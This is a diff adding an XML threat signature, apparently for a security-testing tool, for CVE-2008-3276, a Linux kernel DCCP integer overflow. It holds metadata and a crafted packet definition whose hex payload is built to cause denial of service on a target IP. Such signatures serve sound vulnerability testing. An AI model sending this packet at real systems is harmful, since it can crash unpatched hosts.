@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Linux Kernel DCCP Protocol Handler dccp_setsockopt_change Integer Overflow"/>
+    <EngDesc display="true" value="There exists an integer overflow vulnerability in the Datagram Congestion Control Protocol (DCCP) stack in Linux kernel. The flaw is due to lack of data validation when parsing DCCP datagrams. An unauthenticated remote attacker may leverage this vulnerability to raise a denial of service condition on the target system."/>
+    <Intent display="true">
+      <item value="INTEGER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Linux_Kernel_Organization"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Linux_Kernel_Organization_Linux_Kernel_Organization_Linux_Kernel"/>
+      <item value="Linux_Kernel_Organization_Linux_Kernel_Organization_Ubuntu_Linux"/>
+      <item value="Linux_Kernel_Organization_Linux_Kernel_Organization_Debian_GNU/Linux"/>
+      <item value="Linux_Kernel_Organization_Linux_Kernel_Organization_Mandrake_Linux"/>
+      <item value="Linux_Kernel_Organization_Linux_Kernel_Organization_SUSE_LINUX"/>
+      <item value="Linux_Kernel_Organization_Linux_Kernel_Organization_Desktop_Linux"/>
+      <item value="Linux_Kernel_Organization_Linux_Kernel_Organization_Enterprise_Linux"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Linux_Kernel_Organization_Linux_Kernel_2.6.17-rc1_to_2.6.26_-rc6"/>
+      <item value="Linux_Kernel_Organization_Ubuntu_Linux_"/>
+      <item value="Linux_Kernel_Organization_Debian_GNU/Linux_"/>
+      <item value="Linux_Kernel_Organization_Mandrake_Linux_"/>
+      <item value="Linux_Kernel_Organization_SUSE_LINUX_"/>
+      <item value="Linux_Kernel_Organization_Desktop_Linux_"/>
+      <item value="Linux_Kernel_Organization_Enterprise_Linux_"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20080815-11"/>
+    <CVEID display="true" value="CVE-2008-3276"/>
+    <bugtraqID display="true" value="30704"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="7b390436a5a511dd9571000c29da7492"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633607162127500000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1225169839" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="11B5" FragmentOffset="0000" TTL="FF" Protocol="21" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="C1BE1B58080086B70100001FA03584E401000000000000000000000000200300" CE="false" DF="false" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
